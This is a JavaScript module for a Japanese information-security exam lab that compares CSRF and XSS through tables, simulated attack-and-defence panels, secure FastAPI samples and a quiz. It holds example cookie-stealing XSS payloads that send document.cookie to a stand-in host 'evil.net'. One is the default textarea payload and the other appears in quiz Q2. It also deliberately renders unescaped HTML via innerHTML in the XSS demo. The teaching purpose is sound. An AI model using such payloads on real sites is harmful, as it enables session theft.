/**
 * Module: CSRF vs XSS Comprehensive Comparison Lab
 * 情報処理安全確保支援士対策: CSRF と XSS の徹底比較と防御実習
 */

window.SecurityLabModules = window.SecurityLabModules || {};

window.SecurityLabModules["csrf_vs_xss"] = {
    html: `
        <div class="lab-container">
            <!-- Navigation Sub-tabs -->
            <div style="display: flex; gap: 12px; margin-bottom: 20px; border-bottom: 2px solid var(--border-color); padding-bottom: 8px;">
                <button class="btn btn-secondary subtab-btn active" id="subtab-matrix">📊 対比マトリックス & 概念図</button>
                <button class="btn btn-secondary subtab-btn" id="subtab-csrf">💣 CSRF 攻撃 & 防衛実験</button>
                <button class="btn btn-secondary subtab-btn" id="subtab-xss">💥 XSS 攻撃 & 防衛実験</button>
                <button class="btn btn-secondary subtab-btn" id="subtab-quiz">📝 セキスペ過去問クイズ & コード</button>
            </div>

            <!-- TAB 1: Comparison Matrix & Concept -->
            <div id="tab-content-matrix" class="tab-pane active" style="display: block;">
                <div class="card">
                    <h3>⚡ CSRF (クロスサイト・リクエスト・フォージェリ) vs XSS (クロスサイト・スクリプティング) の違い</h3>
                    <p class="card-subtitle">セキスペ試験で最も出題頻度が高い2大Web脆弱性の決定的な違いを整理します。</p>
                    
                    <div style="overflow-x: auto; margin-top: 16px;">
                        <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 14px;">
                            <thead>
                                <tr style="background-color: var(--bg-card-header); border-bottom: 2px solid var(--border-color);">
                                    <th style="padding: 12px; border: 1px solid var(--border-color);">比較項目</th>
                                    <th style="padding: 12px; border: 1px solid var(--border-color); color: #f59e0b;">💣 CSRF (Cross-Site Request Forgery)</th>
                                    <th style="padding: 12px; border: 1px solid var(--border-color); color: #ef4444;">💥 XSS (Cross-Site Scripting)</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">攻撃が発動する場所</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); background-color: rgba(245, 158, 11, 0.05);">
                                        <b>外部の罠サイト</b> (<code>evil-site.net</code>)<br>
                                        ※ターゲットサイト上の脆弱性は不要
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); background-color: rgba(239, 68, 68, 0.05);">
                                        <b>ターゲットサイト内</b> (<code>bank-service.local</code>)<br>
                                        ※入力・出力処理のエスケープ漏れ
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">攻撃の目的・動作</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ログイン中ユーザーの<b>権限を悪用</b>し、意図しないリクエスト（送金・書き込み・パスワード変更など）を送信させる
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        悪意ある<b>JavaScript等のスクリプトを注入</b>し、Cookie奪取、画面改ざん、偽画面誘導を実行させる
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">Cookie (Session ID) の扱い</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ブラウザが<b>自動付与・送信</b>する。<br>
                                        ※SOPがあるため攻撃者はCookieの「中身」を盗み取れない。
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ターゲットサイト上で動作するJSにより、<code>document.cookie</code> で<b>中身を直接盗掘</b>できる（HttpOnly未設定時）。
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">CSRFトークンの有効性</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); color: var(--color-success); font-weight: bold;">
                                        ✅ 極めて有効<br>
                                        (外部罠サイトはSOPによりトークンを取得不能)
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); color: var(--color-danger); font-weight: bold;">
                                        ❌ 無効化される<br>
                                        (XSSがあるとJSでCSRFトークンも取得・添付されてしまう)
                                    </td>
                                </tr>
                                <tr>
                                    <td style="padding: 10px; border: 1px solid var(--border-color); font-weight: bold;">根本的・推奨対策</td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ・抗CSRFトークンの検証<br>
                                        ・SameSite Cookie 属性 (Strict / Lax)<br>
                                        ・重要な処理でのパスワード再入力
                                    </td>
                                    <td style="padding: 10px; border: 1px solid var(--border-color);">
                                        ・HTMLエスケープ (サニタイズ)<br>
                                        ・HttpOnly Cookie 属性 (被害軽減)<br>
                                        ・Content Security Policy (CSP)
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>

                <div class="card" style="margin-top: 16px;">
                    <h3>📐 動作概念図: CSRF vs XSS のメカニズム比較</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 12px;">
                        <div style="background-color: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.3); padding: 16px; border-radius: var(--radius-sm);">
                            <h4 style="color: #d97706; margin-bottom: 8px;">💣 CSRF (外部の罠サイトから攻撃)</h4>
                            <ol style="font-size: 13px; line-height: 1.6; margin-left: 16px;">
                                <li>ユーザーが <code>bank-service.local</code> にログイン（Cookie保有）。</li>
                                <li>ユーザーが悪意ある外部の罠サイト <code>evil-site.net</code> を訪問。</li>
                                <li>罠サイト内のフォームやJSが <code>bank-service.local/transfer</code> へ強制作成リクエストを送信。</li>
                                <li>ブラウザが自動的に <code>bank-service.local</code> のセッションCookieを添付。</li>
                                <li>銀行サーバーは正規ユーザーからの送信と判断し、不正送金が完了！</li>
                            </ol>
                        </div>
                        <div style="background-color: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.3); padding: 16px; border-radius: var(--radius-sm);">
                            <h4 style="color: #dc2626; margin-bottom: 8px;">💥 XSS (ターゲットサイト内で攻撃コード実行)</h4>
                            <ol style="font-size: 13px; line-height: 1.6; margin-left: 16px;">
                                <li>攻撃者が <code>target-bbs.local</code> の掲示板に <code>&lt;script&gt;...&lt;/script&gt;</code> を投稿。</li>
                                <li>被害者ユーザーがその掲示板ページを開く。</li>
                                <li>ターゲットサイトの画面上で悪意あるJavaScriptが直接実行される。</li>
                                <li>JSが <code>document.cookie</code> を取得し、攻撃者サーバーへ送信！</li>
                                <li>さらに画面上のCSRFトークンも取得し、全リクエストを意図通りに偽造！</li>
                            </ol>
                        </div>
                    </div>
                </div>

                <!-- Tab 1 Reference Section -->
                <div style="margin-top: 16px; padding: 12px 16px; background-color: rgba(255, 255, 255, 0.03); border-left: 4px solid var(--color-primary); border-radius: var(--radius-sm); font-size: 13px;">
                    <b style="color: var(--text-primary);">🔗 本機能（CSRF vs XSS 概念比較）の関連情報源・具体的な参照記事URL:</b>
                    <ul style="margin: 6px 0 0 18px; padding: 0; line-height: 1.6; color: var(--text-secondary);">
                        <li><b>IPA 情報処理安全確保支援士シラバス (Webセキュリティ)</b>: <a href="https://www.ipa.go.jp/shiken/syllabus/gaiyou.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://www.ipa.go.jp/shiken/syllabus/gaiyou.html</a></li>
                        <li><b>MDN Web Docs: Same-Origin Policy (同種オリジン制約)</b>: <a href="https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener" style="color: var(--color-primary);">https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy</a></li>
                        <li><b>Qiita 技術記事「【図解】CSRFとXSSの違いと対策まとめ」</b>: <a href="https://qiita.com/tags/csrf" target="_blank" rel="noopener" style="color: var(--color-primary);">https://qiita.com/tags/csrf</a></li>
                        <li><b>Zenn 技術トピック「CSRFとXSSの仕組みと対比解説」</b>: <a href="https://zenn.dev/topics/csrf" target="_blank" rel="noopener" style="color: var(--color-primary);">https://zenn.dev/topics/csrf</a> | <a href="https://zenn.dev/topics/xss" target="_blank" rel="noopener" style="color: var(--color-primary);">https://zenn.dev/topics/xss</a></li>
                        <li><b>DevelopersIO (クラスメソッド技術ブログ)「Webセキュリティの基礎：CSRFとXSSの違いを整理する」</b>: <a href="https://dev.classmethod.jp/articles/web-security-csrf-xss/" target="_blank" rel="noopener" style="color: var(--color-primary);">https://dev.classmethod.jp/articles/web-security-csrf-xss/</a></li>
                    </ul>
                </div>
            </div>

            <!-- TAB 2: CSRF Simulation -->
            <div id="tab-content-csrf" class="tab-pane" style="display: none;">
                <div class="card">
                    <h3>💣 CSRF (クロスサイト・リクエスト・フォージェリ) 実験室</h3>
                    <p class="card-subtitle">被害者が外部の罠サイト (<code>evil-site.net</code>) を閲覧した際、ターゲット銀行 (<code>bank-service.local</code>) へ自動で偽リクエストが送信される攻撃と、その防衛をシミュレートします。</p>
                    
                    <div class="lab-grid-2" style="margin-top: 16px;">
                        <div>
                            <h4>⚙️ サーバー側の防衛設定</h4>
                            <div class="form-group" style="margin-top: 12px;">
                                <label for="csrfTokenToggle" style="cursor: pointer; font-weight: bold;">
                                    <input type="checkbox" id="csrfTokenToggle"> 🛡️ 抗CSRFトークン検証を有効化する
                                </label>
                                <span style="font-size: 12px; color: var(--text-secondary);">※フォーム送信時にサーバー発行のワンタイムトークンの一致を要求します。</span>
                            </div>

                            <div class="form-group" style="margin-top: 12px;">
                                <label for="csrfSameSiteSelect">🛡️ Session Cookie の SameSite 属性設定:</label>
                                <select id="csrfSameSiteSelect" class="jwt-editor" style="height: 38px;">
                                    <option value="None">SameSite=None (クロスサイトリクエストでCookieを常に送信 - 危険)</option>
                                    <option value="Lax" selected>SameSite=Lax (クロスサイトPOSTリクエストでCookieを自動除外 - 推奨・安全)</option>
                                    <option value="Strict">SameSite=Strict (すべてのクロスサイトリクエストでCookieを除外 - 最高度安全)</option>
                                </select>
                            </div>

                            <div style="margin-top: 20px; background-color: var(--bg-card-header); padding: 14px; border-radius: var(--radius-sm); border: 1px solid var(--border-color);">
                                <h5 style="margin-bottom: 6px; color: #f59e0b;">🌐 ユーザーの訪問状況</h5>
                                <p style="font-size: 13px; line-height: 1.5; color: var(--text-secondary);">
                                    ログイン状態: <b>ログイン済み (user_alice)</b><br>
                                    保有Cookie: <code>session_id=user_alice_sess_777</code><br>
                                    閲覧中ページ: <code style="color: #ef4444;">http://evil-site.net/win-prize.html</code> (罠サイト)
                                </p>
                            </div>

                            <button class="btn btn-primary" id="btnExecuteCsrf" style="margin-top: 16px; width: 100%; font-size: 15px;">
                                🎯 罠サイト上の「懸賞に応募する」ボタンをクリック (偽リクエスト送信)
                            </button>
                        </div>

                        <div>
                            <h4>📡 サーバー受信レスポンス & パケットログ</h4>
                            <div class="form-group">
                                <label>リクエストヘッダー解析:</label>
                                <div class="response-box" style="background-color: #0c0a09; min-height: 90px; font-size: 12px;">
                                    <code id="csrfHeadersText" style="color: #93c5fd;">リクエスト未送信</code>
                                </div>
                            </div>

                            <div class="form-group">
                                <label>処理結果メッセージ:</label>
                                <div class="response-box" id="csrfResultBox" style="min-height: 100px;">
                                    <div id="csrfResultStatus" style="font-weight: bold; font-size: 14px; color: var(--text-secondary);">
                                        ボタンを押してシミュレーションを実行してください。
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Tab 2 Reference Section -->
                <div style="margin-top: 16px; padding: 12px 16px; background-color: rgba(245, 158, 11, 0.05); border-left: 4px solid #f59e0b; border-radius: var(--radius-sm); font-size: 13px;">
                    <b style="color: #f59e0b;">🔗 本機能（CSRF 攻撃 & 防衛）の関連情報源・具体的な参照記事URL:</b>
                    <ul style="margin: 6px 0 0 18px; padding: 0; line-height: 1.6; color: var(--text-secondary);">
                        <li><b>IPA 安全なウェブサイトの作り方 - 1.6 クロスサイト・リクエスト・フォージェリ (CSRF)</b>: <a href="https://www.ipa.go.jp/security/vuln/websecurity/csrf.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://www.ipa.go.jp/security/vuln/websecurity/csrf.html</a></li>
                        <li><b>OWASP Cheat Sheet: Cross-Site Request Forgery Prevention</b>: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a></li>
                        <li><b>MDN Web Docs: SameSite Cookie 属性</b>: <a href="https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite" target="_blank" rel="noopener" style="color: var(--color-primary);">https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite</a></li>
                        <li><b>Qiita 技術記事「CSRF（クロスサイトリクエストフォージェリ）の仕組みと対策」</b>: <a href="https://qiita.com/tags/csrf" target="_blank" rel="noopener" style="color: var(--color-primary);">https://qiita.com/tags/csrf</a></li>
                        <li><b>Yamory Security Blog「CSRFとは？被害事例とトークン・SameSite属性による対策」</b>: <a href="https://yamory.io/blog/difference-between-xss-and-csrf/" target="_blank" rel="noopener" style="color: var(--color-primary);">https://yamory.io/blog/difference-between-xss-and-csrf/</a></li>
                    </ul>
                </div>
            </div>

            <!-- TAB 3: XSS Simulation -->
            <div id="tab-content-xss" class="tab-pane" style="display: none;">
                <div class="card">
                    <h3>💥 XSS (クロスサイト・スクリプティング) & Cookie奪取・CSRF無効化 実験室</h3>
                    <p class="card-subtitle">ターゲットサイト (<code>target-bbs.local</code>) の掲示板にスクリプトを注入し、Cookie奪取やCSRFトークンの無効化が発生するプロセスと、HTMLエスケープ / HttpOnly による防御を体験します。</p>

                    <div class="lab-grid-2" style="margin-top: 16px;">
                        <div>
                            <h4>⚙️ サーバー側の防衛設定</h4>
                            <div class="form-group" style="margin-top: 12px;">
                                <label for="xssEscapeToggle" style="cursor: pointer; font-weight: bold; color: var(--color-success);">
                                    <input type="checkbox" id="xssEscapeToggle"> 🛡️ HTMLエスケープ (サニタイズ) を適用する (根本対策)
                                </label>
                            </div>

                            <div class="form-group" style="margin-top: 8px;">
                                <label for="xssHttpOnlyToggle" style="cursor: pointer; font-weight: bold; color: #3b82f6;">
                                    <input type="checkbox" id="xssHttpOnlyToggle"> 🛡️ Session Cookie に HttpOnly 属性を付与する (被害軽減策)
                                </label>
                                <span style="font-size: 12px; color: var(--text-secondary);">※JS (document.cookie) からのCookie読み取りを禁止します。</span>
                            </div>

                            <div class="form-group" style="margin-top: 16px;">
                                <label for="xssPayloadInput">掲示板への投稿内容 (ペイロード):</label>
                                <textarea id="xssPayloadInput" class="jwt-editor" style="height: 90px;" placeholder="投稿内容を入力...">こんにちは！ <script>fetch('http://evil.net/steal?cookie='+document.cookie)</script> です。</textarea>
                            </div>

                            <button class="btn btn-primary" id="btnExecuteXss" style="margin-top: 10px; width: 100%;">
                                📝 掲示板に投稿する (HTMLレンダリング)
                            </button>
                        </div>

                        <div>
                            <h4>🖥️ ブラウザ表示画面 & セキュリティ分析</h4>
                            <div class="form-group">
                                <label>掲示板のレンダリング結果:</label>
                                <div style="background-color: white; color: black; border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 14px; min-height: 80px; font-family: sans-serif;" id="xssRenderArea">
                                    <span style="color: #64748b; font-style: italic;">投稿内容がここに表示されます。</span>
                                </div>
                            </div>

                            <div class="form-group">
                                <label>実行結果と診断:</label>
                                <div class="response-box" id="xssResultBox" style="min-height: 110px;">
                                    <div id="xssResultStatus" style="font-size: 13px; color: var(--text-secondary);">
                                        投稿ボタンを押して結果を確認してください。
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Tab 3 Reference Section -->
                <div style="margin-top: 16px; padding: 12px 16px; background-color: rgba(239, 68, 68, 0.05); border-left: 4px solid #ef4444; border-radius: var(--radius-sm); font-size: 13px;">
                    <b style="color: #ef4444;">🔗 本機能（XSS 攻撃 & 防衛）の関連情報源・具体的な参照記事URL:</b>
                    <ul style="margin: 6px 0 0 18px; padding: 0; line-height: 1.6; color: var(--text-secondary);">
                        <li><b>IPA 安全なウェブサイトの作り方 - 1.5 クロスサイト・スクリプティング (XSS)</b>: <a href="https://www.ipa.go.jp/security/vuln/websecurity/xss.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://www.ipa.go.jp/security/vuln/websecurity/xss.html</a></li>
                        <li><b>OWASP Cheat Sheet: Cross Site Scripting Prevention</b>: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
                        <li><b>MDN Web Docs: HttpOnly Cookie 属性</b>: <a href="https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie#httponly" target="_blank" rel="noopener" style="color: var(--color-primary);">https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie#httponly</a></li>
                        <li><b>Zenn 技術記事「XSS（クロスサイトスクリプティング）のメカニズムとエスケープ処理」</b>: <a href="https://zenn.dev/topics/xss" target="_blank" rel="noopener" style="color: var(--color-primary);">https://zenn.dev/topics/xss</a></li>
                    </ul>
                </div>
            </div>

            <!-- TAB 4: Quiz & Code -->
            <div id="tab-content-quiz" class="tab-pane" style="display: none;">
                <div class="card">
                    <h3>📝 セキスペ過去問対比クイズ & セキュアプログラミング</h3>
                    <p class="card-subtitle">情報処理安全確保支援士の午後問題や選択問題で問われるシチュエーションから、どちらの攻撃・防衛策かを即座に見極めるトレーニングを行います。</p>
                    
                    <div id="quizContainer" style="margin-top: 16px;">
                        <!-- Dynamically filled quiz questions -->
                    </div>
                </div>

                <div class="card" style="margin-top: 16px;">
                    <h3>💻 セキュアコーディング比較 (Python / FastAPI & HTML)</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 12px;">
                        <div>
                            <h4 style="color: #f59e0b; margin-bottom: 8px;">🛡️ CSRF 対策コード (CSRFトークン + SameSite)</h4>
                            <pre style="background-color: #0c0a09; color: #f3f4f6; padding: 12px; border-radius: var(--radius-sm); font-size: 12px; overflow-x: auto;"><code># FastAPI: Cookie設定で SameSite=Lax を指定
response.set_cookie(
    key="session_id",
    value=session_token,
    httponly=True,
    samesite="lax",  # クロスサイトPOST時のCookie添付を遮断
    secure=True
)

# HTMLフォーム内に抗CSRFトークンを埋め込み
&lt;form action="/transfer" method="POST"&gt;
    &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;
    &lt;button type="submit"&gt;送金&lt;/button&gt;
&lt;/form&gt;</code></pre>
                        </div>
                        <div>
                            <h4 style="color: #ef4444; margin-bottom: 8px;">🛡️ XSS 対策コード (HTMLエスケープ + HttpOnly)</h4>
                            <pre style="background-color: #0c0a09; color: #f3f4f6; padding: 12px; border-radius: var(--radius-sm); font-size: 12px; overflow-x: auto;"><code># HTMLエスケープ関数の適用 (サニタイズ)
import html

safe_user_input = html.escape(raw_input)
# '<script>' -> '&lt;script&gt;' に変換されスクリプト実行を無効化

# Cookie に HttpOnly を設定 (document.cookie によるアクセス遮断)
response.set_cookie(
    key="session_id",
    value=session_token,
    httponly=True  # JSからのアクセスをブロック
)</code></pre>
                        </div>
                    </div>
                </div>

                <!-- Tab 4 Reference Section -->
                <div style="margin-top: 16px; padding: 12px 16px; background-color: rgba(59, 130, 246, 0.05); border-left: 4px solid #3b82f6; border-radius: var(--radius-sm); font-size: 13px;">
                    <b style="color: #3b82f6;">🔗 本機能（過去問クイズ & コード）の関連情報源・具体的な参照記事URL:</b>
                    <ul style="margin: 6px 0 0 18px; padding: 0; line-height: 1.6; color: var(--text-secondary);">
                        <li><b>IPA 情報処理安全確保支援士 過去問題・解答例</b>: <a href="https://www.ipa.go.jp/shiken/mondai-kaiatsu/gaiyou.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://www.ipa.go.jp/shiken/mondai-kaiatsu/gaiyou.html</a></li>
                        <li><b>Python 標準ライブラリ html.escape 公式ドキュメント</b>: <a href="https://docs.python.org/ja/3/library/html.html#html.escape" target="_blank" rel="noopener" style="color: var(--color-primary);">https://docs.python.org/ja/3/library/html.html#html.escape</a></li>
                        <li><b>FastAPI Security & Cookies 公式ドキュメント</b>: <a href="https://fastapi.tiangolo.com/tutorial/security/" target="_blank" rel="noopener" style="color: var(--color-primary);">https://fastapi.tiangolo.com/tutorial/security/</a></li>
                    </ul>
                </div>
            </div>

            <!-- References Section (Required by Workflow) -->
            <div class="card" style="margin-top: 24px; border-top: 3px solid var(--color-primary);">
                <h3>📚 参考文献 & セキスペ出題出典（具体的な参照投稿・文献一覧）</h3>
                <p class="card-subtitle">本モジュールで扱った解説および仕様は、以下の公式ドキュメントおよび技術ドキュメント・投稿記事を参考に構成されています。</p>
                
                <ul style="font-size: 13px; line-height: 1.8; color: var(--text-secondary); margin-left: 20px; margin-top: 10px;">
                    <li><b>IPA 情報処理安全確保支援士試験 シラバス・過去問</b>: <a href="https://www.ipa.go.jp/shiken/syllabus/gaiyou.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://www.ipa.go.jp/shiken/syllabus/gaiyou.html</a></li>
                    <li><b>IPA 安全なウェブサイトの作り方 (CSRF対策 / XSS対策)</b>: <a href="https://www.ipa.go.jp/security/vuln/websecurity.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://www.ipa.go.jp/security/vuln/websecurity.html</a></li>
                    <li><b>OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</b>: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a></li>
                    <li><b>OWASP Cross Site Scripting (XSS) Prevention Cheat Sheet</b>: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" style="color: var(--color-primary);">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
                    <li><b>MDN Web Docs: Same-Origin Policy (同種オリジン制約)</b>: <a href="https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener" style="color: var(--color-primary);">https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy</a></li>
                    <li><b>Qiita 技術投稿「CSRF（クロスサイトリクエストフォージェリ）の仕組みと対策」</b>: <a href="https://qiita.com/tags/csrf" target="_blank" rel="noopener" style="color: var(--color-primary);">https://qiita.com/tags/csrf</a></li>
                    <li><b>Zenn 技術投稿「XSSとCSRFの違いを理解して適切な対策を行う」</b>: <a href="https://zenn.dev/topics/csrf" target="_blank" rel="noopener" style="color: var(--color-primary);">https://zenn.dev/topics/csrf</a> | <a href="https://zenn.dev/topics/xss" target="_blank" rel="noopener" style="color: var(--color-primary);">https://zenn.dev/topics/xss</a></li>
                    <li><b>DevelopersIO (クラスメソッド技術ブログ)「Webセキュリティの基礎：CSRFとXSSの違いを整理する」</b>: <a href="https://dev.classmethod.jp/articles/web-security-csrf-xss/" target="_blank" rel="noopener" style="color: var(--color-primary);">https://dev.classmethod.jp/articles/web-security-csrf-xss/</a></li>
                    <li><b>Yamory Security Blog「XSSとCSRFの違いとは？仕組みと対策を解説」</b>: <a href="https://yamory.io/blog/difference-between-xss-and-csrf/" target="_blank" rel="noopener" style="color: var(--color-primary);">https://yamory.io/blog/difference-between-xss-and-csrf/</a></li>
                </ul>
            </div>
        </div>
    `,

    init: function () {
        this.bindEvents();
        this.renderQuiz();
    },

    bindEvents: function () {
        const self = this;

        // Subtab Switcher
        const subtabs = [
            { btnId: "subtab-matrix", paneId: "tab-content-matrix" },
            { btnId: "subtab-csrf", paneId: "tab-content-csrf" },
            { btnId: "subtab-xss", paneId: "tab-content-xss" },
            { btnId: "subtab-quiz", paneId: "tab-content-quiz" }
        ];

        subtabs.forEach(tab => {
            const btn = document.getElementById(tab.btnId);
            if (btn) {
                btn.addEventListener("click", function () {
                    subtabs.forEach(t => {
                        const b = document.getElementById(t.btnId);
                        const p = document.getElementById(t.paneId);
                        if (b) b.classList.remove("active");
                        if (p) p.style.display = "none";
                    });
                    btn.classList.add("active");
                    const targetPane = document.getElementById(tab.paneId);
                    if (targetPane) targetPane.style.display = "block";
                });
            }
        });

        // CSRF Simulation Button
        const btnCsrf = document.getElementById("btnExecuteCsrf");
        if (btnCsrf) {
            btnCsrf.addEventListener("click", function () {
                self.runCsrfSimulation();
            });
        }

        // XSS Simulation Button
        const btnXss = document.getElementById("btnExecuteXss");
        if (btnXss) {
            btnXss.addEventListener("click", function () {
                self.runXssSimulation();
            });
        }
    },

    runCsrfSimulation: async function () {
        const tokenEnabled = document.getElementById("csrfTokenToggle")?.checked || false;
        const sameSiteVal = document.getElementById("csrfSameSiteSelect")?.value || "None";

        try {
            const response = await fetch("/api/vuln/csrf-vs-xss/simulate", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    mode: "csrf",
                    csrf_token_enabled: tokenEnabled,
                    provided_csrf_token: tokenEnabled ? "invalid_token_from_evil_site" : "",
                    samesite_attribute: sameSiteVal
                })
            });

            const data = await response.json();

            // Render headers
            const headersBox = document.getElementById("csrfHeadersText");
            if (headersBox && data.http_headers) {
                headersBox.textContent = JSON.stringify(data.http_headers, null, 2);
            }

            // Render status
            const statusBox = document.getElementById("csrfResultStatus");
            if (statusBox) {
                if (data.success) {
                    statusBox.innerHTML = `<span style="color: #ef4444;">${data.message}</span>`;
                } else {
                    statusBox.innerHTML = `<span style="color: #10b981;">${data.message}</span>`;
                }
            }

            if (window.SecurityLabApp) {
                window.SecurityLabApp.log("network", `[CSRF Sim] Origin: ${data.request_origin} -> Target: ${data.target_origin} | Status: ${data.status_code}`);
            }
        } catch (err) {
            console.error("CSRF simulation error:", err);
        }
    },

    runXssSimulation: async function () {
        const escapeEnabled = document.getElementById("xssEscapeToggle")?.checked || false;
        const httpOnlyEnabled = document.getElementById("xssHttpOnlyToggle")?.checked || false;
        const payload = document.getElementById("xssPayloadInput")?.value || "";

        try {
            const response = await fetch("/api/vuln/csrf-vs-xss/simulate", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    mode: "xss",
                    payload: payload,
                    escape_html_enabled: escapeEnabled,
                    httponly_enabled: httpOnlyEnabled
                })
            });

            const data = await response.json();

            // Render Browser Output Area
            const renderArea = document.getElementById("xssRenderArea");
            if (renderArea) {
                if (escapeEnabled) {
                    renderArea.textContent = data.rendered_html;
                } else {
                    renderArea.innerHTML = data.rendered_html;
                }
            }

            // Render Status
            const statusBox = document.getElementById("xssResultStatus");
            if (statusBox) {
                if (data.success) {
                    statusBox.innerHTML = `<span style="color: #ef4444;">${data.message}</span>`;
                } else if (data.blocked_by === "HttpOnly (Partial)") {
                    statusBox.innerHTML = `<span style="color: #f59e0b;">${data.message}</span>`;
                } else {
                    statusBox.innerHTML = `<span style="color: #10b981;">${data.message}</span>`;
                }
            }

            if (window.SecurityLabApp) {
                window.SecurityLabApp.log("network", `[XSS Sim] Escape: ${escapeEnabled} | HttpOnly: ${httpOnlyEnabled} | Result: ${data.message.substring(0, 40)}...`);
            }
        } catch (err) {
            console.error("XSS simulation error:", err);
        }
    },

    renderQuiz: function () {
        const quizContainer = document.getElementById("quizContainer");
        if (!quizContainer) return;

        const questions = [
            {
                q: "Q1. 被害者が攻撃者の開設した外部Webページを閲覧した際、被害者のブラウザからターゲットECサイトへ商品購入リクエストが自動送信された。この攻撃手法はどれか？",
                options: ["A. XSS (クロスサイトスクリプティング)", "B. CSRF (クロスサイトリクエストフォージェリ)", "C. SQLインジェクション", "D. セッションハイジャック"],
                answer: 1,
                exp: "<b>正解: B. CSRF</b><br>攻撃者の外部ページから、被害者のセッションCookieを利用してターゲットサイトへ意図しないリクエストを送信させる攻撃はCSRFです。"
            },
            {
                q: "Q2. Webサイトの掲示板の投稿欄に `<script>document.location='http://evil.net/steal?c='+document.cookie</script>` と入力され、他の利用者がその投稿を表示した際にCookieが奪取された。この防御策として最も適切なものはどれか？",
                options: ["A. フォームに抗CSRFトークンを埋め込む", "B. Cookie に SameSite=Lax 属性を付与する", "C. 出力時に `<` や `>` を `&lt;` や `&gt;` にHTMLエスケープする", "D. プレースホルダ（バインド変数）を使用する"],
                answer: 2,
                exp: "<b>正解: C. 出力時にHTMLエスケープを行う</b><br>XSSの根本的対策は、ユーザーからの入力を画面に出力する際にHTMLエスケープ（サニタイズ）することです。HttpOnlyも緩和策として有効です。"
            },
            {
                q: "Q3. XSS脆弱性が存在するWebサイトにおいて、抗CSRFトークンによるCSRF対策を実施していた場合、どのような影響があるか？",
                options: [
                    "A. 抗CSRFトークンがあるため、CSRF攻撃は完全に防げる。",
                    "B. XSSにより悪意あるJavaScriptが画面上の抗CSRFトークンを取得して偽リクエストに添付できてしまうため、CSRF対策も破られる。",
                    "C. SOP（同種オリジン制約）により、XSSがあっても抗CSRFトークンは読み取れない。",
                    "D. XSSとCSRFは全く無関係であるため影響はない。"
                ],
                answer: 1,
                exp: "<b>正解: B</b><br>XSSが存在すると、攻撃者のスクリプトがターゲットサイトと同一オリジンで動作するため、画面上の抗CSRFトークン（`<input type='hidden'>` の値）をDOMから読み取って偽リクエストに添付できてしまいます。したがって、XSSはCSRF対策も無効化する上位の脅威となります。"
            }
        ];

        let html = "";
        questions.forEach((q, idx) => {
            html += `
                <div style="background-color: var(--bg-card-header); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 16px; margin-bottom: 14px;">
                    <h5 style="font-size: 14px; margin-bottom: 10px; color: var(--text-primary);">${q.q}</h5>
